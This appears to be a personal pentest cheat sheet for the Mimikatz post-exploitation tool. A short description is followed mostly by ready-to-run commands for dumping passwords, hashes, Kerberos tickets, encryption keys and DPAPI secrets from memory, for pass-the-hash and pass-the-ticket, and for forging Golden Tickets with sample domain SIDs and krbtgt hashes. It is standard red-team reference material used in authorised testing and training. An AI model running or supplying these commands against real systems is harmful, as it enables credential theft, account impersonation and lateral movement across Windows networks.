# About
Mimikatz is an incredibly effective offensive security tool developed by gentilkiwi. It is a post-exploitation tool that dumps passwords from memory, as well as hashes, PINs and Kerberos tickets. Other useful attacks are pass-the-hash, pass-the-ticket or building Golden Kerberos tickets. This makes post-exploitation lateral movement within a network easy for attackers. Mimikatz is a very powerful tool when attacking,or defending Windows Systems, it can also play with certificates or private keys, vault and more.

Mimikatz can only dump credentials and password hashes if it is executed from the context of a privilege user, like local admin.
## Links
​[Mimikatz github(source)](https://github.com/gentilkiwi/mimikatz)​
​[Mimikatz binaries](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810)
# Usage
- Get debug rights (this or Local System rights is required for many Mimikatz commands).
```
privilege::debug
```
![[Pasted image 20250909132610.png]]
## sekurlsa
- Lists all available provider credentials. This usually shows recently logged on user and computer credentials.
```
sekurlsa::logonpasswords
```
![[Pasted image 20250909132616.png]]

```
sekurlsa::logonpasswords full
```

- Dump and export Kerberos tickets from memory
```
sekurlsa::tickets /export
```
- Pass the hash - PTH
```
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTLMHASH /run:cmd
```
## kerberos
- Dump and export Kerberos tickets from memory associated with active user sessions
```
kerberos::list /export
```
- Pass the ticket - PTT
```
kerberos::ptt c:\chocolate.kirbi
```
- Create a Golden Ticket 
```
kerberos::golden /admin:USER /domain:DOMAIN /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

## ekeys
- Dump encryption keys from the system's memory
```
sekurlsa::ekeys
```
![[Pasted image 20250909132637.png]]
## DPAPI
- Extract and decrypt credentials protected by DPAPI (Data Protection API) from memory
```
sekurlsa::dpapi
```
![[Pasted image 20250909132643.png]]

## Golden/Silver Tickets
```
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

```
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
```

```
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
```

```
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
```

## TGT
- Interact with and manipulate Kerberos tickets
```
kerberos
```

```
kerberos::tgt
```

```
kerberos::list /export
```
![[Pasted image 20250909132629.png]]
